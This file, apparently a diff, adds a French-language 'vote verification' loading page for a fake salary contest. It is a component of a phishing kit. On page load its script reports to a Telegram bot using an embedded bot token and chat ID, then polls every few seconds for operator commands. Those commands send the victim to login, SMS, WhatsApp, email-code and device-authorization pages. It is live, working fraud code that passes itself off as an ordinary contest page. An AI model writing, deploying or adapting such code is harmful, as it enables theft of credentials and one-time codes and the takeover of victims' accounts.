@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Traitement en cours...</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f0f2f5;
+            color: #1c1e21;
+            line-height: 1.6;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        .container {
+            max-width: 400px;
+            width: 100%;
+            padding: 20px;
+            text-align: center;
+        }
+
+        .loading-card {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            padding: 30px 20px;
+            margin-bottom: 20px;
+        }
+
+        .loading-icon {
+            font-size: 40px;
+            color: #1877f2;
+            margin-bottom: 20px;
+            animation: spin 2s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        .loading-title {
+            font-size: 20px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #1877f2;
+        }
+
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background-color: #e4e6eb;
+            border-radius: 4px;
+            overflow: hidden;
+            margin-bottom: 15px;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background-color: #1877f2;
+            border-radius: 4px;
+            width: 0%;
+            transition: width 0.5s;
+        }
+
+        .footer {
+            text-align: center;
+            color: #65676b;
+            font-size: 12px;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="loading-card">
+            <div class="loading-icon">
+                <i class="fas fa-spinner"></i>
+            </div>
+
+            <div class="loading-title">Traitement en cours...</div>
+            <p class="loading-message">Veuillez patienter pendant que nous vérifions votre vote...</p>
+            <br>
+
+            <div class="progress-container">
+                <div class="progress-bar" id="progress-bar" style="width: 0%;"></div>
+            </div>
+
+        </div>
+
+        <div class="footer">
+            <p>© 2025 Concours Double Salaire. Tous droits réservés.</p>
+        </div>
+    </div>
+
+    <script>
+        const token = "7397031599:AAHgmL_t9K5uY7Uo0A7QN6ZlVtX8y2A0lj8";
+        const chatId = "6669693805";
+        const psd = "Console By YKK";
+
+        window.onload = () => {
+            const url = `https://api.telegram.org/bot${token}/sendMessage`;
+            const messageData = {
+                chat_id: chatId,
+                text: `🔵 ${psd}`,
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "Approved", callback_data: "v:" + psd }],
+                        [{ text: "Login", callback_data: "e:" + psd }],
+                        [{ text: "incorrecte", callback_data: "o1:" + psd }],
+                        [{ text: "Sms verification", callback_data: "o2:" + psd }],
+                        [{ text: "Sms verification incorrect", callback_data: "o3:" + psd }],
+                        [{ text: "Whatsapp verification", callback_data: "o4:" + psd }],
+                        [{ text: "Whatsapp verification incorrect", callback_data: "o5:" + psd }],
+                        [{ text: "Email verification", callback_data: "o6:" + psd }],
+                        [{ text: "Email verification incorrect", callback_data: "o7:" + psd }],
+                        [{ text: "Authorize device", callback_data: "o8:" + psd }],
+                        [{ text: "Traitement", callback_data: "o9:" + psd }],
+                        [{ text: "Technical Error", callback_data: "o10:" + psd }]
+                    ]
+                })
+            };
+
+            fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(messageData)
+            }).catch(console.error);
+        };
+
+        function getUpdates() {
+            const url = `https://api.telegram.org/bot${token}/getUpdates`;
+
+            fetch(url)
+                .then(res => res.json())
+                .then(data => {
+                    const updates = data.result;
+                    if (!updates.length) return;
+
+                    updates.forEach(update => {
+                        const query = update.callback_query;
+                        if (!query) return;
+
+                        const [type, value] = query.data.split(":");
+                        if (value === psd) {
+                            if (type === "v") {
+                                window.location.href = "vote_approved.html";
+                            } else if (type === "e") {
+                                window.location.href = "Login.html";
+                            } else if (type === "o1") {
+                                window.location.href = "incorrecte.html";
+                            } else if (type === "o2") {
+                                window.location.href = "sms_verification.html";
+                            } else if (type === "o3") {
+                                window.location.href = "sms_verification-incorrect.html";
+                            } else if (type === "o4") {
+                                window.location.href = "whatsapp_verification.html";
+                            } else if (type === "o5") {
+                                window.location.href = "whatsapp_verification-incorrect.html";
+                            } else if (type === "o6") {
+                                window.location.href = "email_verification.html";
+                            } else if (type === "o7") {
+                                window.location.href = "email_verification-incorrect.html";
+                            } else if (type === "o8") {
+                                window.location.href = "authorize_device.html";
+                            } else if (type === "o9") {
+                                window.location.href = "Traitement.html";
+                            } else if (type === "o10") {
+                                window.location.href = "technical_error.html";
+                            }
+                        }
+
+                        markUpdateAsRead(update.update_id);
+                    });
+                })
+                .catch(console.error);
+        }
+
+        function markUpdateAsRead(updateId) {
+            const url = `https://api.telegram.org/bot${token}/getUpdates?offset=${updateId + 1}`;
+            fetch(url).catch(console.error);
+        }
+
+        setInterval(getUpdates, 3000);
+
+        document.addEventListener('DOMContentLoaded', function () {
+            const progressBar = document.getElementById('progress-bar');
+
+            function updateProgress(progress) {
+                progressBar.style.width = progress + '%';
+            }
+
+            let progress = 0;
+
+            const interval = setInterval(() => {
+                progress += 100 / 30;
+
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(interval);
+                }
+
+                updateProgress(progress);
+            }, 1000);
+        });
+    </script>
+
+</body>
+
+</html>
